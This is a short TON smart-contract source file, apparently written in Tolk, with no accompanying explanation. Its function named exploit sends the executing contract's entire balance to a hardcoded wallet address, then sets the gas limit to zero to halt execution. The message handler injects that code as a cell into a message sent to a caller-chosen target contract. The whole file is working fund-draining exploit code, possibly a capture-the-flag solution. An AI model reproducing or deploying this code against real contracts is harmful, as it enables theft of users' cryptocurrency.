@inline
fun exploit() {
    val msg = beginCell()
        .storeUint(0x10, 6) 
        .storeSlice("0QCfWnJsn6EObZIpyynLFgEI__C5qX4l_WsiaokAZuDW7bT2"a)
        .storeCoins(0)
        .storeUint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
    .endCell();

    sendRawMessage(msg, 128);
    
    commitContractDataAndActions();
    setGasLimit(0);
}

@inline
fun setGasLimit(limit: int): void
    asm "SETGASLIMIT";

fun getExploitCell(): cell
    asm "<{ exploit INLINECALLDICT }>c PUSHREF";

fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) {
    var cs: slice = inMsgFull.beginParse();
    val flags: int = cs.loadUint(4);
    if (flags & 1) { 
        return;
    }

    val target: slice = inMsgBody.loadAddress();
    val msgBody: cell = beginCell()
        .storeUint(0, 32)
        .storeRef(getExploitCell())
    .endCell();
    
    val msg: cell = beginCell()
        .storeUint(0x18, 6)
        .storeSlice(target)
        .storeCoins(0)
        .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
        .storeRef(msgBody)
    .endCell();
                
    sendRawMessage(msg, 64);
}